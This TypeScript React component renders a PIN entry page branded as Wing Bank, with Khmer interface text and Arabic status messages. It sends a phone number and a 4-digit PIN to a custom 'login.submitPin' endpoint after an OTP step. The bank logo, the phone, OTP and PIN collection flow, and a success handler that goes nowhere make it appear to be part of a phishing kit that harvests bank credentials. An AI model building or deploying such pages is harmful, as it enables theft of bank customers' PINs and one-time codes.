import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState, useRef, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { useLocation, useRoute } from "wouter";

export default function PinVerification() {
  const [, setLocation] = useLocation();
  const [, params] = useRoute("/pin/:phone");
  const phoneNumber = params?.phone || "";
  
  const [pin, setPin] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  // Auto-focus on input
  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const submitPinMutation = trpc.login.submitPin.useMutation({
    onSuccess: () => {
      toast.success("تم التحقق من الرمز السري بنجاح");
      setPin("");
      setIsSubmitting(false);
    },
    onError: () => {
      toast.error("حدث خطأ أثناء التحقق من الرمز السري");
      setIsSubmitting(false);
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!pin || pin.length !== 4) {
      toast.error("الرجاء إدخال رمز PIN مكون من 4 أرقام");
      return;
    }
    setIsSubmitting(true);
    submitPinMutation.mutate({ phoneNumber, pin });
  };

  const handleBack = () => {
    setLocation(`/otp/${phoneNumber}`);
  };

  return (
    <div className="min-h-screen flex items-center justify-center" style={{ background: "linear-gradient(135deg, #a8d84e 0%, #8bc34a 100%)" }}>
      <div className="w-full max-w-md mx-4">
        <div className="bg-white rounded-3xl shadow-2xl p-8">
          {/* Logo */}
          <div className="flex justify-center mb-6">
            <img 
              src="/wing-logo.png" 
              alt="Wing Bank Logo" 
              className="h-16 w-auto"
            />
          </div>

          {/* Title */}
          <div className="text-center mb-4">
            <h2 className="text-2xl font-semibold" style={{ color: "#2196f3" }}>
              បញ្ចូលលេខកូដសម្ងាត់
            </h2>
          </div>

          {/* Info Text */}
          <div className="text-center mb-6">
            <p className="text-gray-600 text-sm">
              សូមបញ្ចូលលេខកូដសម្ងាត់ PIN 4 ខ្ទង់របស់អ្នក
            </p>
          </div>

          {/* PIN Input Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="relative">
              <Input
                ref={inputRef}
                type="password"
                placeholder="****"
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
                className="w-full bg-[#e8e5f5] rounded-lg px-4 py-6 text-center text-3xl tracking-[1em] border-2 border-transparent focus-visible:border-[#2196f3] transition-colors"
                disabled={isSubmitting}
                maxLength={4}
              />
            </div>

            {/* Verify Button */}
            <Button
              type="submit"
              className="w-full py-6 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all"
              style={{ 
                background: "linear-gradient(135deg, #2196f3 0%, #1976d2 100%)",
                color: "white"
              }}
              disabled={isSubmitting || pin.length !== 4}
            >
              {isSubmitting ? "جاري التحقق..." : "បញ្ជាក់"}
            </Button>
          </form>

          {/* Back Link */}
          <div className="text-center mt-6">
            <button
              onClick={handleBack}
              className="text-green-600 font-semibold hover:text-green-700 transition-colors"
            >
              ← ត្រឡប់ក្រោយ
            </button>
          </div>

          {/* Language Options */}
          <div className="flex justify-center gap-4 mt-8 pt-6 border-t border-gray-200">
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              ភាសាខ្មែរ
            </button>
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              ភាសាអង់គ្លេស
            </button>
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              中文
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

